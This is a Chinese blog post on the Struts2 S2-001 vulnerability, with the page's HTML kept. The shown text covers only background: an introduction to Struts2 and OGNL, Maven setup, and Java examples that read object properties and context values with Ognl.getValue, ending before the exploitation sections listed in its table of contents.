<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"curlysean.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="Struts2 Struts2简介 Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。  OGNL表达式 对于Struts2的漏洞">
<meta property="og:type" content="article">
<meta property="og:title" content="Struts2-S2-001">
<meta property="og:url" content="http://curlysean.github.io/2025/04/10/Struts2-S2-001/index.html">
<meta property="og:site_name" content="肖恩的博客">
<meta property="og:description" content="Struts2 Struts2简介 Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。  OGNL表达式 对于Struts2的漏洞">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743413953947-619c8050-27cc-44e5-a2f7-45cdf4a4012a.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743414317040-52b9c38e-17a8-44ab-9bd8-5edd3f543993.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743414846060-1e5b8688-714f-4518-b698-dbd8362f0680.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743415413505-4b044844-1002-440a-8390-99167ac92663.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743415917014-5830d2ce-6920-4740-80a9-d81d812c4a34.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743416558563-5643dad0-3c42-4d74-9e17-5ec548c5c1fa.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743416950403-6e977822-33e9-4594-a8cb-c28b5ef35528.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743417080780-c2bdd739-a3ec-4342-9543-3f88616143f1.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743486857729-0d588b21-c03e-4a0d-b43d-952c40642242.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743487680234-4a92ef29-b605-49cb-84de-19414a5e52f5.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743487932957-581b5af6-a0ea-4619-a88e-066b73d942da.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743489041006-a5d29050-e6d7-4ce2-bc57-10cfc06d65e8.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743489792863-b5031d72-c556-4217-bd1c-0c7fa1e34a66.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743490057576-1fbc3552-a31c-47de-b18c-33f7a90d1467.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743490436216-dd4ce8a9-a7f9-47cd-ab34-960ce5b755e8.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743493436739-a64e0e71-7abc-434b-923f-96c2cb69fef0.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743493608672-74519035-a447-4c5c-bd64-6d59829fdabd.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743493881368-7491aaf8-0e23-4842-9940-c3f798f57b01.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743493961354-33f9d879-49a0-43ef-89a6-c18a9327e171.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743495014666-0641ba73-a64c-4874-abbf-6a557cf9ec4a.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743495489057-a8ca10ec-e472-4358-9100-90c800e3e5d8.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743474566019-267cfed1-1471-4458-b677-6f238a1af9bf.png">
<meta property="article:published_time" content="2025-04-10T13:54:26.581Z">
<meta property="article:modified_time" content="2025-04-10T13:55:00.262Z">
<meta property="article:author" content="Sean">
<meta property="article:tag" content="Struts2">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743413953947-619c8050-27cc-44e5-a2f7-45cdf4a4012a.png">


<link rel="canonical" href="http://curlysean.github.io/2025/04/10/Struts2-S2-001/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://curlysean.github.io/2025/04/10/Struts2-S2-001/","path":"2025/04/10/Struts2-S2-001/","title":"Struts2-S2-001"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Struts2-S2-001 | 肖恩的博客</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">肖恩的博客</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#A2dAE"><span class="nav-number">1.</span> <span class="nav-text">Struts2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#okABs"><span class="nav-number">1.1.</span> <span class="nav-text">Struts2简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gVTVp"><span class="nav-number">1.2.</span> <span class="nav-text">OGNL表达式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#wigu8"><span class="nav-number">1.2.1.</span> <span class="nav-text">OGNL简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#grkut"><span class="nav-number">1.2.2.</span> <span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#iq2U1"><span class="nav-number">1.2.3.</span> <span class="nav-text">OGNL表达式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#XNDha"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">OGNL三要素</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#QIcnf"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">OGNL基础使用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#OHdzZ"><span class="nav-number">1.2.3.2.1.</span> <span class="nav-text">对ROOT对象的访问</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#DZvEL"><span class="nav-number">1.2.3.2.2.</span> <span class="nav-text">对上下文对象的访问</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#G3044"><span class="nav-number">1.2.3.2.3.</span> <span class="nav-text">对静态变量与静态方法的访问</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#VcMvP"><span class="nav-number">1.2.3.2.4.</span> <span class="nav-text">方法的调用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ISv3E"><span class="nav-number">1.2.3.2.5.</span> <span class="nav-text">对数组和集合的访问</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#GRoiG"><span class="nav-number">1.2.3.2.6.</span> <span class="nav-text">投影与选择</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#rl2c0"><span class="nav-number">1.2.3.2.7.</span> <span class="nav-text">创建对象</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WwGPD"><span class="nav-number">1.3.</span> <span class="nav-text">S2-001</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AHCsG"><span class="nav-number">1.3.1.</span> <span class="nav-text">漏洞影响范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IItvL"><span class="nav-number">1.3.2.</span> <span class="nav-text">流程分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RyS8z"><span class="nav-number">1.3.3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lc9Hh"><span class="nav-number">1.3.4.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IKwBa"><span class="nav-number">1.4.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Sean"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Sean</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">30</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://curlysean.github.io/2025/04/10/Struts2-S2-001/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Sean">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="肖恩的博客">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Struts2-S2-001 | 肖恩的博客">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Struts2-S2-001
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2025-04-10 21:54:26 / 修改时间：21:55:00" itemprop="dateCreated datePublished" datetime="2025-04-10T21:54:26+08:00">2025-04-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Java/" itemprop="url" rel="index"><span itemprop="name">Java</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="A2dAE">Struts2</h1>
<h2 id="okABs">Struts2简介</h2>
Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。

<h2 id="gVTVp">OGNL表达式</h2>
对于Struts2的漏洞，ONGL表达式是相关的基础，我们来做相关了解

<h3 id="wigu8">OGNL简介</h3>
OGNL 是 Object-Graph Navigation Language 的缩写，它是一种功能强大的表达式语言（Expression Language，简称为 EL），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。

<p>它使用相同的表达式去存取对象的属性。</p>
<h3 id="grkut">环境配置</h3>
环境配置具体看这位师傅的文章了

<p><a target="_blank" rel="noopener" href="https://github.com/Y4tacker/JavaSec/blob/main/7.Struts2%E4%B8%93%E5%8C%BA/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md">https://github.com/Y4tacker/JavaSec/blob/main/7.Struts2%E4%B8%93%E5%8C%BA/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md</a></p>
<h3 id="iq2U1">OGNL表达式</h3>
<h4 id="XNDha">OGNL三要素</h4>

<ul>
<li>表达式（Expression）</li>
</ul>
<p>表达式是OGNL表达式中最为核心的部分，所有的OGNL操作都是针对表达式解析后进行的。通过表达式来告诉OGNL操作到底要干什么。因此表达式是一个<strong>带有语法意义的字符串</strong>，该字符串会规定操作的类型和内容。OGNL 表达式支持大量的表达式，如 “链式访问对象”、表达式计算、甚至还支持 Lambda 表达式。</p>
<ul>
<li>Root 对象</li>
</ul>
<p>OGNL 的 Root 对象可以理解为 OGNL 的操作对象。当我们指定了一个表达式的时候，我们需要指定这个表达式针对的是哪个具体的对象。而这个具体的对象就是 Root 对象，这就意味着，如果有一个 OGNL 表达式，那么我们需要针对 Root 对象来进行 OGNL 表达式的计算并且返回结果。</p>
<ul>
<li>上下文环境</li>
</ul>
<p>有个 Root 对象和表达式，我们就可以使用 OGNL 进行简单的操作了，如对 Root 对象的赋值与取值操作。但是，实际上在 OGNL 的内部，所有的操作都会在一个特定的数据环境中运行。这个数据环境就是上下文环境（Context）。OGNL 的上下文环境是一个 Map 结构，称之为 OgnlContext。Root 对象也会被添加到上下文环境当中去。</p>
<h4 id="QIcnf">OGNL基础使用</h4>
pom.xml文件导入

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;ognl&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;ognl&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;<span class="number">3.1</span><span class="number">.19</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>我们先来创建两个实体类</p>
<p>Address.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Address</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String port;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Address</span><span class="params">(String port,String address)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.port = port;</span><br><span class="line">        <span class="built_in">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPort</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> port;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPort</span><span class="params">(String port)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.port = port;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAddress</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAddress</span><span class="params">(String address)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>User.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Address address;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Address <span class="title function_">getAddress</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAddress</span><span class="params">(Address address)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="OHdzZ">对ROOT对象的访问</h5>
OGNL使用一种链式风格进行对对象的访问

<p>链式编程，如其名是一条长长的链子，类似如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StringBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line"><span class="comment">// 链式编程</span></span><br><span class="line">buffer.append(<span class="string">&quot;aaa&quot;</span>).append(<span class="string">&quot;bbb&quot;</span>).append(<span class="string">&quot;ccc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>对应代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;sean&quot;</span>, <span class="number">20</span>);</span><br><span class="line">        <span class="type">Address</span> <span class="variable">address</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Address</span>(<span class="string">&quot;045000&quot;</span>, <span class="string">&quot;山西晋中&quot;</span>);</span><br><span class="line">        user.setAddress(address);</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;name&quot;</span>, user));   <span class="comment">// sean</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;name.length()&quot;</span>, user));     <span class="comment">// 4</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;address&quot;</span>, user).toString());    <span class="comment">// Address(port=045000, address=山西晋中)</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;address.port&quot;</span>, user));   <span class="comment">// 045000</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743413953947-619c8050-27cc-44e5-a2f7-45cdf4a4012a.png"></p>
<h5 id="DZvEL">对上下文对象的访问</h5>
使用OGNL的时候，若不设置上下文对象，系统就会自动创建一个上下文对象，如果传入的参数当中包含了上下文对象的参数，则会使用传入的上下文对象

<p>当我们访问上下文环境中的参数时，需要在表达式前面加<code>#</code>，表示了与访问根ROOT对象的区别</p>
<p>对应代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;sean&quot;</span>, <span class="number">20</span>);</span><br><span class="line">        <span class="type">Address</span> <span class="variable">address</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Address</span>(<span class="string">&quot;045000&quot;</span>, <span class="string">&quot;山西晋中&quot;</span>);</span><br><span class="line">        user.setAddress(address);</span><br><span class="line">        Map&lt;String, Object&gt; context = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">        context.put(<span class="string">&quot;init&quot;</span>, <span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        context.put(<span class="string">&quot;user&quot;</span>, user);</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#init&quot;</span>, context, user));</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#user.name&quot;</span>, context, user));</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;age&quot;</span>, context, user));</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#user&quot;</span>, context, user));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743414317040-52b9c38e-17a8-44ab-9bd8-5edd3f543993.png"></p>
<h5 id="G3044">对静态变量与静态方法的访问</h5>

<p>同样的，OGNL也可以对静态变量和静态方法进行调用，格式如<code>\@[class]@[field/method ()]</code></p>
<p>对应代码如下</p>
